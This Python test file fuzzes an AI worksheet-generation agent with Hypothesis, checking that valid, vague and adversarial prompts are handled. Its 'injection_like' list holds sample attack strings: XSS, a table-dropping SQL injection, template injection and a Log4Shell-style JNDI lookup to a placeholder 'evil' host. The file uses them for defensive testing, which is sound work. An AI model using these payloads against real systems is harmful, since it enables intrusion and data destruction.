import os
import time

import pytest
from hypothesis import given, settings, HealthCheck, strategies as st
from unittest.mock import AsyncMock, MagicMock

from langchain_core.messages import HumanMessage
from langgraph.checkpoint.memory import MemorySaver

import das_agent.nodes.nodes as nodes_module
from das_agent.graph.agent import build_workflow
from das_agent.worksheet.schemas import (
    GeneratedMCQWorksheet,
    GeneratedOpenEndedWorksheet,
    MCQWorksheetItem,
    OpenEndedWorksheetItem,
)


settings.register_profile("dev", max_examples=25, deadline=None)
settings.register_profile(
    "ci", max_examples=300, deadline=None,
    suppress_health_check=[HealthCheck.function_scoped_fixture],
)
settings.register_profile(
    "fuzz",
    max_examples=100_000,
    deadline=None,
    suppress_health_check=[
        HealthCheck.function_scoped_fixture,
        HealthCheck.too_slow,
        HealthCheck.data_too_large,
    ],
)
settings.load_profile(os.getenv("HYPOTHESIS_PROFILE", "dev"))


TOPICS = [
    "Subject-Verb Agreement",
    "Reading Comprehension",
    "Phonics - Short Vowels",
    "Sight Words",
    "Sentence Structure",
]
QN_TYPE_PHRASES = {
    "MCQ": ["MCQ questions", "multiple choice questions", "a multiple-choice quiz"],
    "Open_ended": ["open-ended questions", "short-answer questions"],
}
BANDS = ["Band A", "Band B", "Band C", None]


@st.composite
def valid_prompt(draw):
    topic = draw(st.sampled_from(TOPICS))
    qn_type = draw(st.sampled_from(["MCQ", "Open_ended"]))
    phrase = draw(st.sampled_from(QN_TYPE_PHRASES[qn_type]))
    count = draw(st.integers(min_value=1, max_value=20))
    band = draw(st.sampled_from(BANDS))
    band_clause = f" for {band}" if band else ""
    text = f"Create {count} {phrase} on {topic}{band_clause}."
    return text, qn_type, topic, count


VAGUE_PROMPTS = [
    "Can you help me?",
    "Make a worksheet.",
    "I need something for my student.",
    "quiz please",
    "asdkjhasd",
    "Give me 5 questions.",          # no topic, no format
    "Something about grammar",       # no clear format
]
invalid_prompt = st.sampled_from(VAGUE_PROMPTS)

unicode_text = st.text(
    alphabet=st.characters(blacklist_categories=("Cs",)),
    max_size=2000,
)

injection_like = st.sampled_from(
    [
        "<script>alert(1)</script>",
        "'; DROP TABLE worksheets; --",
        "{{7*7}}",
        "${jndi:ldap://evil/a}",
        "\x00\x01\x02 null bytes here",
        "A" * 5000,
        "\n\n\n\t\t\t   ",
        "🎉🚀🤖" * 50,
        "‮reversed bidi override‬ text",
        "Create -5 questions on Nothing.",
        "Create 999999999999999999999 MCQ questions on Sight Words.",
        "Create 3.14159 open-ended questions on Fractions.",
        "Create 1e10 MCQ questions on Big Numbers.",
        "Create ① ② ③ questions on Roman Numerals.", 
        "",
    ]
)

# Numbers embedded in noisy text for adversarial prompt coverage.
noisy_number_text = st.builds(
    lambda n, prefix, suffix: f"{prefix}{n}{suffix}",
    n=st.integers(min_value=-(10**12), max_value=10**12),
    prefix=st.sampled_from(["Create ", "I need ", "   ", "###", "Q:", ""]),
    suffix=st.sampled_from(
        [" MCQ questions on Grammar.", " questions", "!!!", "", " please 🙏"]
    ),
)


def _make_mcq_worksheet(count, topic):
    items = []
    for i in range(count):
        options = [f"Option {i}-{j}" for j in range(4)]
        answer = options[i % 4]
        items.append(
            MCQWorksheetItem(question=f"What is example {i} of {topic}?", options=options, answer=answer)
        )
    return GeneratedMCQWorksheet(
        title=f"{topic} Worksheet",
        readingPassage="A short passage used for comprehension context.",
        instructions="Read each question and choose the best answer.",
        items=items,
    )


def _make_open_worksheet(count, topic):
    items = [
        OpenEndedWorksheetItem(question=f"Explain example {i} of {topic}.", options=[], answer=f"Sample answer {i}")
        for i in range(count)
    ]
    return GeneratedOpenEndedWorksheet(
        title=f"{topic} Worksheet",
        readingPassage="A short passage used for comprehension context.",
        instructions="Read each question and write your answer in the space provided.",
        items=items,
    )


def _fake_intent_llm(
    monkeypatch,
    qn_type,
    topic,
    sufficient=True,
    reason=None,
    question_count=None,
):
    fake_result = MagicMock()
    fake_result.action = "create" if sufficient else "clarify"
    fake_result.has_sufficient_info = sufficient
    fake_result.qn_type = qn_type if sufficient else None
    fake_result.topic = topic if sufficient else None
    fake_result.difficulty = "medium"
    fake_result.question_count = question_count
    fake_result.revision_instruction = None
    fake_result.reason = reason

    structured = MagicMock()
    structured.ainvoke = AsyncMock(return_value=fake_result)

    llm_instance = MagicMock()
    llm_instance.with_structured_output.return_value = structured

    monkeypatch.setattr(
        nodes_module, "ChatOpenRouter", lambda **kwargs: llm_instance
    )


def _make_worksheet_llm(qn_type, count, topic="General"):
    worksheet = (
        _make_mcq_worksheet(count, topic)
        if qn_type == "MCQ"
        else _make_open_worksheet(count, topic)
    )

    structured = MagicMock()
    structured.ainvoke = AsyncMock(return_value=worksheet)

    llm_instance = MagicMock()
    llm_instance.with_structured_output.return_value = structured
    return llm_instance


def _make_retriever():
    retriever = MagicMock()
    retriever.retrieve_and_rerank = MagicMock(return_value=[])
    return retriever

@settings(suppress_health_check=[HealthCheck.function_scoped_fixture], deadline=None)
@given(valid_prompt())
@pytest.mark.asyncio
async def test_valid_prompts_generate_worksheet(monkeypatch, data):
    user_prompt, qn_type, topic, expected_count = data
    _fake_intent_llm(
        monkeypatch,
        qn_type=qn_type,
        topic=topic,
        question_count=expected_count,
    )

    worksheet_llm = _make_worksheet_llm(qn_type, expected_count, topic)
    retriever = _make_retriever()
    graph = build_workflow(retriever, worksheet_llm).compile()

    result = await graph.ainvoke({"messages": [HumanMessage(content=user_prompt)]})

    assert "generated_worksheet" in result
    assert result["generated_worksheet"]["title"]
    assert len(result["generated_worksheet"]["items"]) == expected_count


@settings(suppress_health_check=[HealthCheck.function_scoped_fixture], deadline=None)
@given(invalid_prompt)
@pytest.mark.asyncio
async def test_invalid_prompts_ask_for_clarification(monkeypatch, user_prompt):
    _fake_intent_llm(
        monkeypatch,
        qn_type=None,
        topic=None,
        sufficient=False,
        reason="Missing worksheet topic and/or question format.",
    )

    worksheet_llm = _make_worksheet_llm("MCQ", 15)
    retriever = _make_retriever()

    checkpointer = MemorySaver()
    graph = build_workflow(retriever, worksheet_llm).compile(checkpointer=checkpointer)
    config = {"configurable": {"thread_id": f"fuzz-{hash(user_prompt)}"}}

    result = await graph.ainvoke(
        {"messages": [HumanMessage(content=user_prompt)]}, config=config
    )

    assert "generated_worksheet" not in result
    assert result.get("__interrupt__")


@settings(suppress_health_check=[HealthCheck.function_scoped_fixture], deadline=None)
@given(st.one_of(injection_like, unicode_text))
@pytest.mark.asyncio
async def test_graph_survives_adversarial_prompts(monkeypatch, user_prompt):
    _fake_intent_llm(
        monkeypatch,
        qn_type=None,
        topic=None,
        sufficient=False,
        reason="Missing worksheet topic and/or question format.",
    )
    worksheet_llm = _make_worksheet_llm("MCQ", 5)
    retriever = _make_retriever()

    checkpointer = MemorySaver()
    graph = build_workflow(retriever, worksheet_llm).compile(checkpointer=checkpointer)
    config = {"configurable": {"thread_id": f"adv-{hash(user_prompt)}"}}

    result = await graph.ainvoke(
        {"messages": [HumanMessage(content=user_prompt)]}, config=config
    )


    assert result.get("__interrupt__") or "generated_worksheet" in result


mcq_item_strategy = st.builds(
    lambda q, opts, ans_idx: {
        "question": q,
        "options": opts,
        "answer": opts[ans_idx % len(opts)] if opts else "N/A",
    },
    q=st.text(min_size=0, max_size=500),
    opts=st.lists(st.text(min_size=0, max_size=200), min_size=0, max_size=8),
    ans_idx=st.integers(min_value=0, max_value=10),
)


@given(item=mcq_item_strategy)
def test_mcq_worksheet_item_validation_never_crashes_uncleanly(item):
    try:
        built = MCQWorksheetItem(**item)
    except Exception as exc:
        assert exc.__class__.__name__ in ("ValidationError", "ValueError")
        return
    assert built.answer in built.options or not built.options



@pytest.mark.skipif(
    os.getenv("RUN_FUZZ_CAMPAIGN") != "1",
    reason="Long-running fuzz campaign; set RUN_FUZZ_CAMPAIGN=1 to enable.",
)
@pytest.mark.asyncio
async def test_long_running_fuzz_campaign(monkeypatch):
    duration_seconds = float(os.getenv("FUZZ_CAMPAIGN_SECONDS", "60"))
    deadline = time.monotonic() + duration_seconds

    _fake_intent_llm(
        monkeypatch, qn_type=None, topic=None, sufficient=False,
        reason="Missing worksheet topic and/or question format.",
    )
    worksheet_llm = _make_worksheet_llm("MCQ", 5)
    retriever = _make_retriever()
    checkpointer = MemorySaver()
    graph = build_workflow(retriever, worksheet_llm).compile(checkpointer=checkpointer)

    strategy = st.one_of(unicode_text, injection_like, noisy_number_text)
    failures = []
    iterations = 0

    while time.monotonic() < deadline:
        example = strategy.example()
        iterations += 1
        try:
            config = {"configurable": {"thread_id": f"campaign-{iterations}"}}
            result = await graph.ainvoke(
                {"messages": [HumanMessage(content=example)]}, config=config
            )
            assert result.get("__interrupt__") or "generated_worksheet" in result
        except Exception as exc:  
            failures.append((example, repr(exc)))

    print(f"[fuzz campaign] ran {iterations} iterations in {duration_seconds}s, "
          f"{len(failures)} failures")
    if failures:
        sample = failures[:10]
        pytest.fail(
            f"{len(failures)} failures out of {iterations} iterations. "
            f"First {len(sample)}: {sample}"
        )
